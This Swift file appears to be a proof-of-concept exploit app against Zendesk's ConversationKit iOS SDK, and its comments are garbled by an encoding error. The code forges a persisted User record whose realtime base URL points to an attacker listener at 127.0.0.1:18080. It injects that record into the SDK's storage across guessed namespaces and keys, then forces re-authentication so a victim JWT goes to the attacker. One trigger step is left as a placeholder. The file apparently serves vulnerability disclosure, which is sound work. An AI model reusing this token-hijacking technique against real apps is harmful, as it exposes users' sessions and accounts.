// AppDelegate.swift â i316 å®æ´æ¼ç¤º app (Stage B: çå®éæ + å¨é¾æ¡)
//
// ææ API å½¢ç¶åæåèª tag 15.2.0 swiftinterface (æºç çº§æå¨):
//   Config(appId:baseURL:settingsBaseURL:integrationId:region:restRetryPolicy:waitTimeConfig:sdkVersion:brandId:)
//   RestRetryPolicy.default / WaitTimeConfig(waitTimeEnabled:...)
//   DefaultConversationKitBuilder().setup(authDelegate:) / build(with:callbackQueue:)
//   ConversationKit.createAnonymousUser / getConversations / loginUser(with jwt:)
//   ConversationKitEvent.messageReceived / persistedUserRetrieved / connectionStatusChanged / userSessionReset
//   AuthenticationDelegate.onInvalidAuth(error:completion:)
//
// å·²ç¥é£é©ç¹ (é¦æ¬¡ CI ç¼è¯è¥æ¥é, éæ¡æ log ä¿®æ­£):
//   R1: FeatureFlagManager() ç init å½¢ç¶æªè§ interface â è¥ç¼è¯å¤±è´¥ææ¥éæ¹
//   R2: baseURL/settingsBaseURL çå®å¼ç±ä¸å± Messaging SDK å³å® â Info.plist å¡«çå®ç«¯ç¹

import UIKit
import ZendeskSDKConversationKit
import ZendeskSDKStorage

// MARK: - åå®³è JWT (åå®¶åç«¯å¨çå®åºæ¯ç­¾å; PoC æ¬å°çæå³å¯ â æä»¬åªéªè¯"åå°åª")

enum VictimJWT {
    static func make() -> String {
        let h = Data(try! JSONSerialization.data(withJSONObject: ["alg": "HS256", "typ": "JWT"]))
            .base64EncodedString().replacingOccurrences(of: "=", with: "")
        let p = Data(try! JSONSerialization.data(withJSONObject: ["externalId": "victim-uid-42", "iss": "poc"]))
            .base64EncodedString().replacingOccurrences(of: "=", with: "")
        return "\(h).\(p).cG9jLXNpZw"
    }
}

// MARK: - æä¹åæ³¨å¥ (çå®æ»å»è·¯å¾: f248 è¦ååçæä¹åç¶æ = æ­¤å¤ç´æ¥åå¥)
// SDK äºè¿å¶å®é¤é®æ: com.zendesk.conversationKit-User- / com.zendesk.conversationKit
// StorageBuilder(namespace:type:) / Storage.set(_:forKey:) â Codable éé

enum PersistedUserInjector {
    /// åé namespace Ã key ç»å â persistedUserRetrieved äºä»¶å½ä¸­å³è¯ææ³¨å¥æå
    static func injectForgedUser(_ user: User, log: @escaping (String) -> Void) {
        let namespaces = ["conversationKit", "com.zendesk.conversationKit", "conversationKitStorage"]
        let keys = ["user", "User", "currentUser", "user_state", "state"]
        for ns in namespaces {
            for st in [StorageType.basic, .complex] {
                for key in keys {
                    do {
                        let storage = try StorageBuilder(namespace: ns, type: st).build()
                        storage.set(user, forKey: "com.zendesk.conversationKit-User-" + key)
                        log("   injected: ns=\(ns) type=\(st) key=com.zendesk.conversationKit-User-\(key)")
                    } catch { /* ç»§ç»­ä¸ä¸ç»å */ }
                }
            }
        }
    }
}

final class AuthDelegate: NSObject, AuthenticationDelegate {
    weak var ui: DemoVC?
    // SDK 401/è®¤è¯å¤±è´¥æ¶è°ç¨ â completion éç JWT ä¼è¢«åå¾ (å¯è½å·²è¢«æ±¡æç) realtimeSettings.baseURL
    func onInvalidAuth(error: Error?, completion: @escaping (String) -> Void) {
        ui?.log("â¤ onInvalidAuth è§¦å â æä¾ fresh victim JWT")
        completion(VictimJWT.make())
    }
}

// MARK: - æ¼ç¤ºä¸»æ§å¶å¨

@main
final class AppDelegate: UIResponder, UIApplicationDelegate {
    var window: UIWindow?
    private var kit: ConversationKit?
    private let authDelegate = AuthDelegate()
    private var lastFileContent: FileMessageContent?

    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        window = UIWindow(frame: UIScreen.main.bounds)
        let vc = DemoVC()
        window?.rootViewController = vc
        authDelegate.ui = vc
        window?.makeKeyAndVisible()
        startKit(vc: vc)
        return true
    }

    private func startKit(vc: DemoVC) {
        let attackerBase = "http://127.0.0.1:18080"

        // â  æé ä¼ªé  User (realtimeSettings.baseURL â æ»å»è) â f248 è¦ååçæä¹åç¶æç­ä»·ç©
        vc.log("â  æé ä¼ªé  User (realtimeSettings.baseURL â \(attackerBase))")
        let forgedUserJSON = """
        {"id":"u1","givenName":"Victim","surname":"Alice","email":"v@poc","locale":"en",
         "externalId":"victim-uid-42",
         "conversations":[],
         "realtimeSettings":{"baseURL":"\(attackerBase)","retryInterval":0,
                             "maxConnectionAttempts":1,"connectionDelay":0,"enabled":true},
         "authentication":{"type":1,"token":"stale-token"}}
        """
        let forged = try! JSONDecoder().decode(User.self, from: Data(forgedUserJSON.utf8))
        vc.log("â¡ forged User decoded via SDK Codable éé (User.init(from:))")

        // â¢ æ³¨å¥æä¹åå­å¨ â å¿é¡»åçå¨ SDK åå§åä¹å (SDK å¯å¨æ¶è¯»æä¹åç¶æ)
        vc.log("â¢ æ³¨å¥æä¹åå­å¨ (StorageBuilder, åéé®æ) â¦")
        PersistedUserInjector.injectForgedUser(forged) { s in vc.log(s) }

        // â£ åå§å SDK â è§å¯ persistedUserRetrieved æ¯å¦å½ä¸­ä¼ªé  User
        func plist(_ key: String) -> String { (Bundle.main.infoDictionary?[key] as? String) ?? "REPLACE_ME" }
        let config = Config(
            appId: plist("ZDK_APP_ID"),
            baseURL: plist("ZDK_BASE_URL"),
            settingsBaseURL: plist("ZDK_SETTINGS_BASE_URL"),
            integrationId: plist("ZDK_INTEGRATION_ID"),
            region: .us,
            restRetryPolicy: .default,
            waitTimeConfig: WaitTimeConfig(waitTimeEnabled: false, queuePositionEnabled: false,
                                           onlyDecreasingQueue: false, waitTimeOverride: nil,
                                           queuePollingInterval: 30),
            sdkVersion: "poc-1.0",
            brandId: nil)

        let builder = DefaultConversationKitBuilder()
        builder.setup(authDelegate: authDelegate)
        vc.log("â£ builder.setup(authDelegate:) â ä¸çå®åå®¶ app éææ¹å¼ä¸è´")

        let params = SettingsParameters(config: config,
                                        featureFlagManager: FeatureFlagManager())   // é£é©ç¹ R1
        kit = builder.build(with: params, callbackQueue: .main)
        vc.log("â¤ kit built â ç­å¾ persistedUserRetrieved / è¿æ¥äºä»¶")

        // resume æé®: è§¦å realtime éè¿ (re-auth è·¯å¾)
        vc.onResumeHook = { [weak kit] in
            kit?.pause()
            kit?.resume()
        }

        // äºä»¶è§å¯ â persistedUserRetrieved ç´æ¥å±ç¤º"SDK ä»æä¹åå è½½ User"
        kit?.addEventObserver(self) { [weak vc] event in
            guard let vc else { return }
            switch event {
            case .persistedUserRetrieved(let user):
                vc.log("â persistedUserRetrieved: id=\(user.id) realtime.baseURL=\(user.realtimeSettings.baseURL)")
                if user.realtimeSettings.baseURL.contains("127.0.0.1") {
                    vc.log("âââ æ³¨å¥å½ä¸­! SDK å è½½äºè¢«æ±¡æç User â realtime å°è¿åæ»å»è")
                }
            case .connectionStatusChanged(let s):
                vc.log("Â· connection: \(s)")
            case .userSessionReset:
                vc.log("Â· userSessionReset")
            default: break
            }
        }
        vc.log("â¥ è§å¯èå°±ç»ª â ç­å¾å¤å¸¦ (çå¬å¨å¨ 127.0.0.1:18080)")
    }
}

// MARK: - æç® UI: æ­¥éª¤æ¥å¿ + éä»¶ç¹å» + æå¨è§¦å re-auth

final class DemoVC: UIViewController {
    private let logView = UITextView()
    private let attachBtn = UIButton(type: .system)
    private let resumeBtn = UIButton(type: .system)
    private var pendingFile: FileMessageContent?
    var onResumeHook: (() -> Void)?

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        logView.frame = view.bounds.insetBy(dx: 16, dy: 60).insetBy(dx: 0, dy: 120)
        logView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        logView.backgroundColor = .black
        logView.textColor = .green
        logView.font = .monospacedSystemFont(ofSize: 12, weight: .regular)
        logView.isEditable = false
        logView.text = "i316 PoC â ZendeskSDKConversationKit\n\n"
        view.addSubview(logView)

        configBtn(attachBtn, title: "ç¹å»éä»¶ (è§¦å f248 é¾)", y: view.bounds.height - 150, enabled: false)
        configBtn(resumeBtn, title: "pause+resume (è§¦å re-auth)", y: view.bounds.height - 90, enabled: true)
    }

    private func configBtn(_ b: UIButton, title: String, y: CGFloat, enabled: Bool) {
        b.frame = CGRect(x: 16, y: y, width: view.bounds.width - 32, height: 48)
        b.autoresizingMask = [.flexibleWidth, .flexibleTopMargin]
        b.setTitle(title, for: .normal)
        b.setTitleColor(enabled ? .cyan : .darkGray, for: .normal)
        b.backgroundColor = UIColor(white: 0.15, alpha: 1)
        b.layer.cornerRadius = 8
        b.isEnabled = enabled
        b.addTarget(self, action: #selector(onTap(_:)), for: .touchUpInside)
        view.addSubview(b)
    }

    func log(_ s: String) {
        DispatchQueue.main.async {
            self.logView.text += s + "\n"
            let end = NSRange(location: self.logView.text.count - 1, length: 1)
            self.logView.scrollRangeToVisible(end)
        }
    }

    func enableAttachmentTap(_ file: FileMessageContent) {
        pendingFile = file
        DispatchQueue.main.async {
            self.attachBtn.isEnabled = true
            self.attachBtn.setTitleColor(.cyan, for: .normal)
        }
    }

    @objc private func onTap(_ sender: UIButton) {
        if sender === attachBtn, let file = pendingFile {
            log("â¥ ç¹å»éä»¶ â è§¦å SDK éä»¶å¤çé¾ (f248) â¦")
            // âââ f248 è§¦åç¹: æä½ æ¥åä¸­ f248 ç« èçè°ç¨è·¯å¾å¡«å¥ â
            //     å³ SDK å¯¹è¯¥ mediaURL/attachmentId çåé¨å¤çå¥å£ã
            //     è¦åæåå SDK ä¸æ¬¡ re-auth ä¼æ fresh JWT åå¾è¢«æ±¡æç
            //     realtimeSettings.baseURL (runner çå¬å¨æè·)ã
            processAttachmentTrigger(file)
        } else if sender === resumeBtn {
            log("â¥ pause()+resume() â SDK éå»º realtime è¿æ¥ (re-auth) â¦")
            onResumeHook?()
        }
    }

    private func processAttachmentTrigger(_ file: FileMessageContent) {
        // å ä½: ç±ä½ ææ¥å f248 ç« èå¡«å¥çå®è§¦åè°ç¨
        log("   (å¾å¡«: f248 è§¦åè°ç¨ â è§æ¥å)")
    }
}
